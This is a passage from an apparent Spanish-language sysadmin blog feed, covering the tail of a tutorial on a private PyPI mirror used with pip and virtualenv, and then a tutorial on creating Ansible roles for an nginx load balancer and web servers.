                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mongoengine/&amp;quot;&lt;/span&gt;&amp;gt;mongoengine&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
                 &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pymongo/&amp;quot;&lt;/span&gt;&amp;gt;pymongo&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
        &amp;lt;/body&amp;gt;
    &amp;lt;/html&amp;gt;

root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Descargamos los &lt;em&gt;scripts&lt;/em&gt; de creación del &lt;em&gt;virtualenv&lt;/em&gt;, tal como lo hacemos mas arriba.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pyclient:~# wget -q https://pypi.python.org/packages/5c/79/5dae7494b9f5ed061cff9a8ab8d6e1f02db352f3facf907d9eb614fb80e9/virtualenv-15.0.2.tar.gz
root@pyclient:~# tar xzf virtualenv-15.0.2.tar.gz
root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos un &lt;em&gt;virtualenv&lt;/em&gt; en donde instalar los paquetes y lo activamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pyclient:~# ./virtualenv-15.0.2/virtualenv.py env
New python executable in /root/env/bin/python
Installing setuptools, pip, wheel...done.
root@pyclient:~# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo usamos para instalar alguno de los paquetes. Es importante ver que modificamos el &lt;em&gt;index url&lt;/em&gt;, para usar nuestro servidor, y que debemos indicarle que confíe en nuestro servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~# pip install --trusted-host &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 -i http://10.0.0.2:8080/simple/ mongoengine
Collecting mongoengine
  Downloading http://10.0.0.2:8080/packages/mongoengine-0.10.6-py2-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;90kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 92kB &lt;span class="m"&gt;10&lt;/span&gt;.9MB/s
Collecting pymongo&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.1 &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://10.0.0.2:8080/packages/pymongo-3.2.2-cp27-cp27mu-linux_i686.whl &lt;span class="o"&gt;(&lt;/span&gt;209kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 215kB &lt;span class="m"&gt;9&lt;/span&gt;.9MB/s
Installing collected packages: pymongo, mongoengine
Successfully installed mongoengine-0.10.6 pymongo-3.2.2
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Podemos crear un fichero de configuración de &lt;em&gt;pip&lt;/em&gt; para que esos parámetros queden ocultos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~# mkdir -p /root/.config/pip/
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~# cat /root/.config/pip/pip.conf
&lt;span class="o"&gt;[&lt;/span&gt;global&lt;span class="o"&gt;]&lt;/span&gt;
index-url &lt;span class="o"&gt;=&lt;/span&gt; http://10.0.0.2:8080/simple/
trusted-host &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras aplicar el truco, nos queda una orden &lt;em&gt;pip&lt;/em&gt; bastante mas bonita, sin tantos parámetros que recordar y nos permite trabajar como la haríamos sin el servidor intermedio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~# pip install flask
Collecting flask
  Downloading http://10.0.0.2:8080/packages/Flask-0.11.1-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;80kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 81kB &lt;span class="m"&gt;10&lt;/span&gt;.5MB/s
Collecting click&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://10.0.0.2:8080/packages/click-6.6-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;71kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 71kB &lt;span class="m"&gt;11&lt;/span&gt;.3MB/s
Collecting Werkzeug&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Retrying &lt;span class="o"&gt;(&lt;/span&gt;Retry&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;total&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;, &lt;span class="nv"&gt;connect&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;None, &lt;span class="nv"&gt;read&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;None, &lt;span class="nv"&gt;redirect&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;None&lt;span class="o"&gt;))&lt;/span&gt; after connection broken by &lt;span class="s1"&gt;&amp;#39;ProtocolError(&amp;#39;&lt;/span&gt;Connection aborted.&lt;span class="s1"&gt;&amp;#39;, error(104, &amp;#39;&lt;/span&gt;Conexi&lt;span class="se"&gt;\x&lt;/span&gt;c3&lt;span class="se"&gt;\x&lt;/span&gt;b3n reinicializada por la m&lt;span class="se"&gt;\x&lt;/span&gt;c3&lt;span class="se"&gt;\x&lt;/span&gt;a1quina remota&lt;span class="s1"&gt;&amp;#39;))&amp;#39;&lt;/span&gt;: /packages/Werkzeug-0.11.10-py2.py3-none-any.whl
  Downloading http://10.0.0.2:8080/packages/Werkzeug-0.11.10-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;306kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 307kB &lt;span class="m"&gt;8&lt;/span&gt;.3MB/s
Collecting Jinja2&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.4 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://10.0.0.2:8080/packages/Jinja2-2.8-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;263kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 266kB &lt;span class="m"&gt;9&lt;/span&gt;.0MB/s
Collecting itsdangerous&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.21 &lt;span class="o"&gt;(&lt;/span&gt;from flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://10.0.0.2:8080/packages/itsdangerous-0.24-py2-none-any.whl
Collecting MarkupSafe &lt;span class="o"&gt;(&lt;/span&gt;from Jinja2&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.4-&amp;gt;flask&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading http://10.0.0.2:8080/packages/MarkupSafe-0.23-py2-none-any.whl
Installing collected packages: click, Werkzeug, MarkupSafe, Jinja2, itsdangerous, flask
Successfully installed Jinja2-2.8 MarkupSafe-0.23 Werkzeug-0.11.10 click-6.6 flask-0.11.1 itsdangerous-0.24
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente salimos del &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@pyclient:~# deactivate
root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como punto final, queda indicar que si el paquete no está en nuestro servidor, no pasa nada; nuestro servidor va a pasar la petición al índica &lt;em&gt;pypi&lt;/em&gt; titular, de forma transparente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@pyclient:~# ./env/bin/pip install requests
Collecting requests
  Downloading requests-2.10.0-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;506kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 512kB &lt;span class="m"&gt;1&lt;/span&gt;.0MB/s
Installing collected packages: requests
Successfully installed requests-2.10.0
root@pyclient:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Activar un &lt;em&gt;virtualenv&lt;/em&gt; solo pone su carpeta &lt;em&gt;bin&lt;/em&gt; en el &lt;em&gt;PATH&lt;/em&gt;. Podemos ahorrarnos comandos invocando directamente esos binarios, por ejemplo &lt;em&gt;pip&lt;/em&gt;. Esto es lo que se ha hecho en el comando anterior.&lt;/p&gt;</content><category term="python"></category><category term="PyPI"></category><category term="wheel"></category><category term="virtualenv"></category><category term="uWSGI"></category></entry><entry><title>Creando roles con ansible</title><link href="http://www.linuxsysadmin.ml/2016/08/creando-roles-con-ansible.html" rel="alternate"></link><published>2016-08-29T08:00:00+02:00</published><updated>2016-08-29T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-29:/2016/08/creando-roles-con-ansible.html</id><summary type="html">&lt;p&gt;Ya vimos que es muy fácil crear varias máquinas iguales con &lt;strong&gt;ansible&lt;/strong&gt;. A veces nos puede interesar disponer de recetas y decidir en un &lt;em&gt;playbook&lt;/em&gt; general cuales de ellas ponemos en cada servidor. Una receta podría añadir un servidor de aplicaciones mientras que otra podría habilitarnos una bases de datos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos que es muy fácil crear varias máquinas iguales con &lt;strong&gt;ansible&lt;/strong&gt;. A veces nos puede interesar disponer de recetas y decidir en un &lt;em&gt;playbook&lt;/em&gt; general cuales de ellas ponemos en cada servidor. Una receta podría añadir un servidor de aplicaciones mientras que otra podría habilitarnos una bases de datos.&lt;/p&gt;
&lt;p&gt;Esto nos permite combinar las recetas para desplegar toda la funcionalidad de nuestro servicio, distribuyéndolas entre nuestros servidores de acuerdo a las necesidades. Como ejemplo, podríamos poner el servidor de &lt;em&gt;PHP&lt;/em&gt; y el de &lt;em&gt;MySQL&lt;/em&gt; en recetas distintas; pondríamos las 2 en el mismo servidor para un entorno de test, y podríamos separar los servicios entre servidores (incluso replicando) en entornos mas profesionales.&lt;/p&gt;
&lt;p&gt;Para esta demostración, vamos a crear &lt;em&gt;roles&lt;/em&gt; para un entorno de un balanceador y dos servidores web normales. En ambos casos, el servicio estándar va a ser &lt;strong&gt;nginx&lt;/strong&gt;, lo que nos abre a la posibilidad de reusar partes comunes, usando dependencias entre ellos.&lt;/p&gt;
&lt;p&gt;También podemos encontrar roles prefabricados y listos para usarse en &lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;El entorno&lt;/h2&gt;
&lt;p&gt;Disponemos de 3 máquinas en el entorno, y de otra máquina desde la que lanzaremos los &lt;em&gt;playbooks&lt;/em&gt;. Hemos utilizado los contenedores &lt;strong&gt;Docker&lt;/strong&gt; de &lt;a href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt; por comodidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;
slave1

&lt;span class="o"&gt;[&lt;/span&gt;web&lt;span class="o"&gt;]&lt;/span&gt;
slave2
slave3
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping balancer&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping web&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave3 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Como crear un rol&lt;/h2&gt;
&lt;p&gt;Lo primero para entender que es un rol y como funcionan es mirar en &lt;a href="http://docs.ansible.com/ansible/playbooks_roles.html#roles"&gt;la documentación&lt;/a&gt;. Es especialmente interesante saber que tiene cada carpeta y para que sirve; solo voy a explicar las que usemos.&lt;/p&gt;
&lt;p&gt;Lanzamos el comando &lt;strong&gt;ansible-galaxy&lt;/strong&gt; para crear un rol vacío:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-galaxy init --offline roles/test&lt;/span&gt;
- roles/test was created successfully
~ &lt;span class="c1"&gt;# tree roles/test/&lt;/span&gt;
roles/test/
├── README.md
├── defaults
│   └── main.yml
├── files
├── handlers
│   └── main.yml
├── meta
│   └── main.yml
├── tasks
│   └── main.yml
├── templates
├── tests
│   ├── inventory
│   └── test.yml
└── vars
    └── main.yml

&lt;span class="m"&gt;8&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las carpetas mas interesantes son la de &lt;em&gt;tasks&lt;/em&gt; la de &lt;em&gt;meta&lt;/em&gt;, la de &lt;em&gt;files&lt;/em&gt; y la de &lt;em&gt;templates&lt;/em&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;tasks&lt;/strong&gt; &amp;rarr; es donde se ponen los pasos a ejecutar en el &lt;em&gt;playbook&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;meta&lt;/strong&gt; &amp;rarr; es donde se especifican las dependencias con otros roles.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;files&lt;/strong&gt; y &lt;strong&gt;templates&lt;/strong&gt; &amp;rarr; aquí se ponen los ficheros que se utilizan en los módulos de ficheros y de plantillas, respectivamente.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A partir de aquí se trata de eliminar las que no usemos y rellenar las que sí vayamos a usar.&lt;/p&gt;
&lt;h2&gt;Diseño de roles&lt;/h2&gt;
&lt;p&gt;Queremos preparar 2 tipos distintos de máquinas: el balanceador y los servidores web. En ambos casos se trata de instalar &lt;strong&gt;nginx&lt;/strong&gt;, poner una configuración para la tarea que desempeñen, y en caso de los servidores web, poner el contenido estático.&lt;/p&gt;
&lt;p&gt;Vamos a crear un &lt;em&gt;role&lt;/em&gt; para el balanceador, y otro para los servidores web. Siguiendo la filosofía &lt;a href="https://es.wikipedia.org/wiki/No_te_repitas"&gt;DRY (Don't repeat yourself)&lt;/a&gt;, vamos a delegar la instalación de &lt;strong&gt;nginx&lt;/strong&gt; a un tercer &lt;em&gt;role&lt;/em&gt;, que a su vez será una dependencia para los otros dos.&lt;/p&gt;
&lt;p&gt;Eso nos da 3 roles, con una estructura de ficheros simple; un rol para el &lt;strong&gt;nginx&lt;/strong&gt; que solo ejecuta tareas, otro para el balanceador (con la dependencia y los ficheros auxiliares) y otro rol para el servidor web (con la dependencia y sus ficheros).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# tree roles/&lt;/span&gt;
roles/
├── balancer
│   ├── meta
│   │   └── main.yml
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       └── balancer.j2
├── nginx
│   └── tasks
│       └── main.yml
└── web
    ├── meta
    │   └── main.yml
    ├── tasks
    │   └── main.yml
    └── templates
        ├── index.j2
        └── web.j2

&lt;span class="m"&gt;10&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El rol de nginx&lt;/h3&gt;
&lt;p&gt;El único propósito de este rol es instalar &lt;strong&gt;nginx&lt;/strong&gt;, retirar el &lt;em&gt;site&lt;/em&gt; que viene por defecto, y asegurar que esté corriendo el servicio (en contenedores &lt;strong&gt;docker&lt;/strong&gt; no se levantan tras instalarse). La idea es que el resto de roles van a poner una configuración y a recargar el &lt;strong&gt;nginx&lt;/strong&gt; para aplicarla; así que de momento, nos vale.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/nginx/tasks/main.yml &lt;/span&gt;
---
- name: Install nginx
  apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
- name: Ensure example virtualhost is not there
  file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/default &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;absent
- name: Ensure nginx is running
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resto de carpetas son innecesarias, así que las borramos.&lt;/p&gt;
&lt;h3&gt;El rol web&lt;/h3&gt;
&lt;p&gt;Este rol espera tener &lt;strong&gt;nginx&lt;/strong&gt; instalado y se limita a poner la configuración del mismo, así como el contenido web.&lt;/p&gt;
&lt;p&gt;El primer paso es declarar que tenemos una dependencia con el rol &lt;em&gt;nginx&lt;/em&gt;. Esto se hace en la carpeta &lt;em&gt;meta&lt;/em&gt;, y nos asegura que se habrá ejecutado antes el rol &lt;em&gt;nginx&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/meta/main.yml &lt;/span&gt;
dependencies:
  - nginx
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos especificar los pasos para tener nuestro rol completo, partiendo de un rol &lt;em&gt;nginx&lt;/em&gt; aplicado. Básicamente se trata de poner la directiva &lt;em&gt;server&lt;/em&gt; que nos interese, el contenido web en &lt;em&gt;/var/www/html&lt;/em&gt; y hacer un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como punto interesante, se han usado plantillas para crear los ficheros destino. Esto nos permite crear las configuraciones basándonos en variables, que vendrán del &lt;em&gt;playbook&lt;/em&gt; general. En el caso concreto de la configuración del &lt;strong&gt;nginx&lt;/strong&gt; no era necesario usar plantillas porque no usa variables; se podría haber puesto el fichero en la carpeta &lt;em&gt;files&lt;/em&gt; y usar el módulo &lt;em&gt;copy&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/tasks/main.yml &lt;/span&gt;
---
- name: Put content virtualhost
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;web.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/web
- name: Put HTML files
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;index.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/www/html/index.html
- name: Reload nginx configuration
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, necesitamos poner las plantillas en &lt;em&gt;templates&lt;/em&gt;, siguiendo la sintaxis adecuada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/templates/web.j2 &lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    root /var/www/html&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# cat roles/web/templates/index.j2 &lt;/span&gt;
Hello from &lt;span class="o"&gt;{{&lt;/span&gt; name &lt;span class="o"&gt;}}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Eliminamos todas las carpetas que no nos sirven, y hemos acabado.&lt;/p&gt;
&lt;h3&gt;El rol balancer&lt;/h3&gt;
&lt;p&gt;Partiendo de que tenemos &lt;strong&gt;nginx&lt;/strong&gt; instalado, solo hay que poner una configuración concreta para que se haga balanceo, tras lo que haremos un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como en el caso anterior, tenemos que declarar la dependencia con el rol &lt;em&gt;nginx&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/meta/main.yml &lt;/span&gt;
dependencies:
  - nginx
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los pasos, de forma análoga al caso anterior, se ponen en la carpeta &lt;em&gt;tasks&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/tasks/main.yml &lt;/span&gt;
---
- name: Put balancer virtualhost
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;balancer.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/balancer
- name: Reload nginx configuration
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente ponemos la plantilla para la configuración en &lt;em&gt;templates&lt;/em&gt;. Nuevamente esperamos la variable &lt;em&gt;backends&lt;/em&gt; desde el &lt;em&gt;playbook&lt;/em&gt; principal, que es una lista de servidores de &lt;em&gt;backend&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/templates/balancer.j2 &lt;/span&gt;
upstream backends &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;% &lt;span class="k"&gt;for&lt;/span&gt; backend in backends %&lt;span class="o"&gt;}&lt;/span&gt;
    server &lt;span class="o"&gt;{{&lt;/span&gt; backend &lt;span class="o"&gt;}}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endfor %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://backends&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y limpiamos el resto de carpetas.&lt;/p&gt;
&lt;h2&gt;Usando los roles&lt;/h2&gt;
&lt;p&gt;Disponemos de tres máquinas, accesibles desde la red, con los nombres &lt;em&gt;slave1&lt;/em&gt;, &lt;em&gt;slave2&lt;/em&gt; y &lt;em&gt;slave3&lt;/em&gt;. Como hemos visto en el fichero de inventario, el &lt;em&gt;slave1&lt;/em&gt; va a ejercer de balanceador, mientras que los otros dos harán de servidores web.&lt;/p&gt;
&lt;p&gt;Para ello solo hay que asignarles el rol que les toca, con las variables que estos roles necesitan. Teniendo los roles preparados, es tan fácil como indicar que servidor hace cada rol, indicando las variables que nos interesan en este entorno concreto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat myenv.yml &lt;/span&gt;
- name: Install balancer
  hosts: balancer
  roles:
    - role: balancer
      backends:
        - slave2:80
        - slave3:80
- name: Install webservers
  hosts: web
  roles:
    - role: web
      name: &lt;span class="s2"&gt;&amp;quot;web_{{ ansible_hostname }}&amp;quot;&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


